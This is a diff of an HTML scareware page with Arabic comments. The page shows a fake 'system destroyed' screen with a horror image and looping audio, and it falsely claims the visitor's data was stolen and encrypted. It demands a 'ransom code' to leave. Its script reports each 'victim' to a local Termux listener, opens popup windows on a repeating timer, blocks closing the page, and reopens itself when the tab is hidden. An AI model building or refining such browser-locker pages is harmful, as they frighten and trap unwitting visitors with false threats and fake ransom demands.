@@ -5,7 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>☠️ 505 SYSTEM_DESTROYED ☠️</title>
     <style>
-        /* واجهة الديب ويب: سواد مطلق وسيطرة كاملة */
         body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background-color: #000; display: flex; justify-content: center; align-items: center; cursor: none; }
         
         #horrorImg { 
@@ -13,38 +12,43 @@
             width: 100vw; height: 100vh; 
             object-fit: cover; 
             z-index: 9999; display: none; 
-            filter: contrast(150%) brightness(80%);
+            /* تعديل الصورة: تباين عالي باش العينين الكحولة يبانوا مليح سواسوة */
+            filter: contrast(180%) brightness(90%);
         }
 
+        /* واجهة الرعب المطلق: "العينان السوادوان" سواسوة */
         #deepWebOverlay { 
             position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); 
             z-index: 10000; color: #f00; text-align: center; font-family: 'Courier New', monospace; 
-            background: rgba(0,0,0,0.95); padding: 40px; border: 1px solid #300; display: none; width: 95%; 
-            box-shadow: 0 0 50px #f00;
+            background: rgba(0,0,0,0.9); padding: 40px; border: 1px solid #300; display: none; width: 95%; 
+            box-shadow: 0 0 70px #f00;
         }
 
-        .matrix-text { color: #f00; font-size: 10px; position: fixed; top: 0; left: 0; width: 100%; height: 100%; opacity: 0.1; z-index: 1; pointer-events: none; }
+        /* ميزة الرعب الجديدة: وميض العينين الكحولة سواسوة */
+        .horror-eyes-blink { animation: horrorBlinker 0.08s linear infinite; }
+        @keyframes horrorBlinker { 50% { opacity: 0.1; } }
+
         .blink { animation: blinker 0.05s linear infinite; }
         @keyframes blinker { 50% { opacity: 0; } }
         
-        #unlockBox { margin-top: 20px; border: 1px solid #f00; background: #000; color: #f00; padding: 10px; width: 70%; text-align: center; }
+        #unlockBox { margin-top: 20px; border: 1px solid #f00; background: #000; color: #f00; padding: 10px; width: 70%; text-align: center; font-family: monospace; }
     </style>
 </head>
 <body onclick="launchNightmare()">
 
-    <div id="clickAnywhere" style="color: #300; font-family: monospace; z-index: 10001; font-size: 12px;">
+    <div id="clickAnywhere" style="color: #300; font-family: monospace; z-index: 10001; font-size: 12px; cursor: pointer;">
         [ FATAL_ERROR: CLICK_TO_RESTORE_SYSTEM ]
     </div>
 
     <img id="horrorImg" src="https://i.ibb.co/39snnynW/1000016067.jpg">
     
     <div id="deepWebOverlay">
-        <h1 class="blink" style="font-size: 24px; letter-spacing: 5px;">WE ARE WATCHING YOU</h1>
-        <p style="font-size: 14px; color: #fff; border-bottom: 1px solid #f00; padding-bottom: 10px;">
-            لقد وقعت في فخ النظام المظلم. جميع بياناتك تم سحبها وتشفيرها في خوادم الديب ويب.
+        <h1 class="horror-eyes-blink" style="font-size: 28px; letter-spacing: 7px; text-shadow: 0 0 15px #f00;">SEEING THROUGH YOUR EYES</h1>
+        <p style="font-size: 14px; color: #fff; border-bottom: 1px solid #f00; padding-bottom: 10px; font-weight: bold;">
+            أنت لا ترانا، ولكننا نراك.. لقد حصلنا على كامل بياناتك.
         </p>
-        <p style="font-size: 12px; color: #888;">IP_LOGGED: <span id="ip_display">192.168.1.1</span> | LOCATION: <span style="color:#f00;">TRACKED</span></p>
-        <p style="font-size: 11px;">محاولة الخروج تعني تدمير اللوحة الأم (Motherboard) فوراً.</p>
+        <p style="font-size: 11px; color: #888;">IP: <span id="ip_display">LOGGED</span> | DATA_TRANSFER: <span style="color:#f00;">100%</span></p>
+        <p class="blink" style="font-size: 10px; color: #f00; margin-top: 10px;">DO NOT CLOSE THIS PAGE</p>
         
         <input type="text" id="unlockBox" placeholder="أدخل رمز الفدية للمغادرة" oninput="verifyAdmin()">
         <div id="status" style="font-size: 10px; margin-top: 10px;">STATUS: <span class="blink">LOCKED</span></div>
@@ -64,9 +68,8 @@
         }
 
         function launchNightmare() {
-            if (isAdmin) return alert("System Bypass: Active. Welcome Admin.");
+            if (isAdmin) return alert("Welcome Admin. Bypass Active.");
             
-            // إرسال تنبيه لـ Termux سواسوة
             fetch('http://localhost:8080/victim_entry', {mode: 'no-cors'}).catch(() => {});
             localStorage.setItem('terminal_breach', 'true');
 
@@ -77,7 +80,7 @@
             audio.play();
             audio.onended = () => { if(!isAdmin) audio.play(); };
 
-            // ميزة "الحبس المحطم" سواسوة
+            // ميزة الحبس المحطم (لا تغيير سواسوة)
             setInterval(() => {
                 if (!isAdmin) {
                     window.open(MY_LINK, '_blank', 'width=10,height=10');
@@ -93,7 +96,7 @@
             }
         }
 
-        // إجبارية البقاء سواسوة
+        // إجبارية البقاء (لا تغيير سواسوة)
         window.onbeforeunload = () => "تحذير: سيتم مسح بياناتك!";
         document.addEventListener("visibilitychange", () => {
             if (!isAdmin && document.visibilityState === 'hidden') window.open(MY_LINK, '_blank');
